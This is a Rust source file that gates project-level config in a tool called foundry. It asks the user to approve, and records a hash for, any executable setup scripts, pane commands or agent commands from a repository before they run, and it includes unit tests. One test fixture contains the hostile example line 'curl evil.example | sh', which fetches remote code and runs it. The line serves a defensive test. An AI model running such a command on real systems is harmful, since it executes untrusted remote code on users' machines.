//! Trust gating for project-level configuration.
//!
//! `.foundry.toml` lives in the repo root and is checked into version control,
//! so its contents are supplied by whoever wrote the repository — not
//! necessarily by the person running foundry. Several of its keys are
//! executable: setup and teardown scripts run through `sh -c`, pane `command`
//! overrides are typed into a shell, and `agent_command` is run verbatim. That
//! means `git clone && foundry start` would otherwise execute code from an
//! untrusted repo with no prompt at all.
//!
//! This module applies the direnv model: the first time a project config with
//! executable content is used, foundry shows exactly what would run and asks
//! for approval, then records a hash of the file. The approval is re-requested
//! whenever the file changes. Configs with no executable content never prompt.

use anyhow::{Context, Result, bail};
use serde::{Deserialize, Serialize};
use std::collections::BTreeMap;
use std::io::{IsTerminal, Write};
use std::path::{Path, PathBuf};

use crate::config::ProjectConfig;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
struct TrustFile {
    /// Canonical project root path -> SHA-256 of the approved `.foundry.toml`.
    #[serde(default)]
    projects: BTreeMap<String, String>,
}

/// Approved project config hashes, persisted to `~/.foundry/trust.toml`.
#[derive(Debug, Clone)]
pub struct TrustStore {
    inner: TrustFile,
}

impl TrustStore {
    pub fn load_from(path: &Path) -> Result<Self> {
        if !path.exists() {
            return Ok(Self {
                inner: TrustFile::default(),
            });
        }
        let contents = std::fs::read_to_string(path)
            .with_context(|| format!("failed to read {}", path.display()))?;
        let inner: TrustFile = toml::from_str(&contents)
            .with_context(|| format!("failed to parse {}", path.display()))?;
        Ok(Self { inner })
    }

    pub fn save_to(&self, path: &Path) -> Result<()> {
        let contents =
            toml::to_string_pretty(&self.inner).context("failed to serialize trust store")?;
        crate::fs_util::write_atomic(path, &contents)
    }

    /// True if `hash` is the approved hash for this project root.
    pub fn is_trusted(&self, repo_root: &Path, hash: &str) -> bool {
        self.inner.projects.get(&key_for(repo_root)) == Some(&hash.to_string())
    }

    pub fn trust(&mut self, repo_root: &Path, hash: &str) {
        self.inner
            .projects
            .insert(key_for(repo_root), hash.to_string());
    }

    /// Remove any approval for this project root. Returns true if one existed.
    pub fn revoke(&mut self, repo_root: &Path) -> bool {
        self.inner.projects.remove(&key_for(repo_root)).is_some()
    }
}

/// The key a project root is stored under. Canonicalized so that symlinked or
/// non-normalized paths resolve to the same entry; falls back to the path as
/// given when the directory cannot be resolved.
fn key_for(repo_root: &Path) -> String {
    std::fs::canonicalize(repo_root)
        .unwrap_or_else(|_| repo_root.to_path_buf())
        .to_string_lossy()
        .into_owned()
}

pub fn trust_store_path() -> Result<PathBuf> {
    Ok(crate::config::foundry_dir()?.join("trust.toml"))
}

/// SHA-256 of the raw config file, as lowercase hex.
///
/// The whole file is hashed rather than just its executable keys: a change
/// anywhere is cheap to re-approve, and hashing a subset would let an edit
/// slip through by moving executable content between keys.
pub fn hash_config(contents: &str) -> String {
    use sha2::{Digest, Sha256};
    let digest = Sha256::digest(contents.as_bytes());
    digest.iter().map(|b| format!("{b:02x}")).collect()
}

/// Human-readable descriptions of everything in this config that can execute.
///
/// An empty result means the config is inert and needs no approval.
pub fn executable_directives(config: &ProjectConfig) -> Vec<String> {
    let mut found = Vec::new();

    for script in &config.scripts.setup {
        found.push(format!(
            "setup script '{}': {}",
            script.name, script.command
        ));
    }
    for script in &config.scripts.teardown {
        found.push(format!(
            "teardown script '{}': {}",
            script.name, script.command
        ));
    }

    // BTreeMap-like stable ordering so the prompt reads the same every time.
    let mut pane_names: Vec<&String> = config.panes.keys().collect();
    pane_names.sort();
    for pane_name in pane_names {
        if let Some(cmd) = config.panes[pane_name].command.as_deref() {
            found.push(format!("pane '{pane_name}' command: {cmd}"));
        }
    }

    if let Some(ref cmd) = config.agent_command {
        found.push(format!("custom agent command: {cmd}"));
    }

    found
}

/// Ensure the project config at `repo_root` has been approved by the user.
///
/// Returns `Ok(())` immediately when the config contains nothing executable.
/// Otherwise the stored hash must match, or the user must approve
/// interactively. Refuses rather than prompting when stdin is not a terminal,
/// so an unattended run can never auto-approve a repo's code.
pub fn ensure_trusted(repo_root: &Path, contents: &str, config: &ProjectConfig) -> Result<()> {
    let directives = executable_directives(config);
    if directives.is_empty() {
        return Ok(());
    }

    let hash = hash_config(contents);
    let store_path = trust_store_path()?;
    let mut store = TrustStore::load_from(&store_path)?;

    if store.is_trusted(repo_root, &hash) {
        return Ok(());
    }

    let config_path = repo_root.join(".foundry.toml");

    if !std::io::stdin().is_terminal() {
        bail!(
            "{} has not been approved and contains commands foundry would run:\n{}\n\n\
             Refusing to run it in a non-interactive session. Review the file, then approve it with:\n  \
             foundry trust {}",
            config_path.display(),
            format_directives(&directives),
            repo_root.display()
        );
    }

    eprintln!(
        "\n{} contains commands that foundry will run:\n{}\n",
        config_path.display(),
        format_directives(&directives)
    );
    eprintln!(
        "This file comes from the repository, not from your own configuration. \
         Only approve it if you trust this repo."
    );
    eprint!("Trust this project config? [y/N] ");
    std::io::stderr().flush()?;

    let mut input = String::new();
    std::io::stdin().read_line(&mut input)?;
    if !input.trim().eq_ignore_ascii_case("y") {
        bail!(
            "project config not approved. Review {} and re-run, or approve it with:\n  \
             foundry trust {}",
            config_path.display(),
            repo_root.display()
        );
    }

    store.trust(repo_root, &hash);
    store.save_to(&store_path)?;
    eprintln!("Approved. Foundry will ask again if this file changes.\n");

    Ok(())
}

fn format_directives(directives: &[String]) -> String {
    directives
        .iter()
        .map(|d| format!("  - {d}"))
        .collect::<Vec<_>>()
        .join("\n")
}

#[cfg(test)]
mod tests {
    use super::*;
    use tempfile::TempDir;

    fn parse(toml_src: &str) -> ProjectConfig {
        toml::from_str(toml_src).unwrap()
    }

    #[test]
    fn hash_is_stable_and_content_sensitive() {
        assert_eq!(hash_config("a = 1"), hash_config("a = 1"));
        assert_ne!(hash_config("a = 1"), hash_config("a = 2"));
        assert_eq!(hash_config("").len(), 64);
    }

    #[test]
    fn inert_config_has_no_directives() {
        let config = parse(
            r#"
            branch_prefix = "user"
            ports = ["VITE_PORT"]
            context = "some notes"
        "#,
        );
        assert!(executable_directives(&config).is_empty());
    }

    #[test]
    fn setup_and_teardown_scripts_are_directives() {
        let config = parse(
            r#"
            [[scripts.setup]]
            name = "install"
            command = "pnpm install"

            [[scripts.teardown]]
            name = "clean"
            command = "rm -rf node_modules"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 2);
        assert!(directives[0].contains("pnpm install"));
        assert!(directives[1].contains("rm -rf node_modules"));
    }

    #[test]
    fn pane_command_override_is_a_directive() {
        let config = parse(
            r#"
            [panes.shell]
            command = "curl evil.example | sh"
        "#,
        );
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1);
        assert!(directives[0].contains("curl evil.example | sh"));
    }

    #[test]
    fn agent_command_is_a_directive() {
        let config = parse(r#"agent_command = "my-agent --flag""#);
        let directives = executable_directives(&config);
        assert_eq!(directives.len(), 1);
        assert!(directives[0].contains("my-agent --flag"));
    }

    /// A pane override that only sets env must not trigger a prompt — env is
    /// not executed on its own.
    #[test]
    fn pane_env_only_override_is_not_a_directive() {
        let config = parse(
            r#"
            [panes.shell]
            env = { FOO = "bar" }
        "#,
        );
        assert!(executable_directives(&config).is_empty());
    }

    #[test]
    fn trust_roundtrips_through_the_store() {
        let dir = TempDir::new().unwrap();
        let store_path = dir.path().join("trust.toml");
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&store_path).unwrap();
        assert!(!store.is_trusted(&repo, "abc"));
        store.trust(&repo, "abc");
        store.save_to(&store_path).unwrap();

        let reloaded = TrustStore::load_from(&store_path).unwrap();
        assert!(reloaded.is_trusted(&repo, "abc"));
    }

    /// Approval is bound to the exact file contents, so an edited config is
    /// untrusted again.
    #[test]
    fn changed_config_is_no_longer_trusted() {
        let dir = TempDir::new().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo, &hash_config("command = \"safe\""));

        assert!(store.is_trusted(&repo, &hash_config("command = \"safe\"")));
        assert!(!store.is_trusted(&repo, &hash_config("command = \"evil\"")));
    }

    #[test]
    fn revoke_removes_the_approval() {
        let dir = TempDir::new().unwrap();
        let repo = dir.path().join("repo");
        std::fs::create_dir_all(&repo).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo, "abc");
        assert!(store.revoke(&repo));
        assert!(!store.is_trusted(&repo, "abc"));
        assert!(!store.revoke(&repo));
    }

    /// Trust for one repo must not carry over to another.
    #[test]
    fn trust_is_scoped_per_project() {
        let dir = TempDir::new().unwrap();
        let repo_a = dir.path().join("a");
        let repo_b = dir.path().join("b");
        std::fs::create_dir_all(&repo_a).unwrap();
        std::fs::create_dir_all(&repo_b).unwrap();

        let mut store = TrustStore::load_from(&dir.path().join("trust.toml")).unwrap();
        store.trust(&repo_a, "abc");
        assert!(store.is_trusted(&repo_a, "abc"));
        assert!(!store.is_trusted(&repo_b, "abc"));
    }

    /// An inert config must never prompt, even with no trust store present.
    #[test]
    fn ensure_trusted_passes_for_inert_config() {
        let dir = TempDir::new().unwrap();
        let config = parse(r#"branch_prefix = "user""#);
        ensure_trusted(dir.path(), r#"branch_prefix = "user""#, &config).unwrap();
    }
}
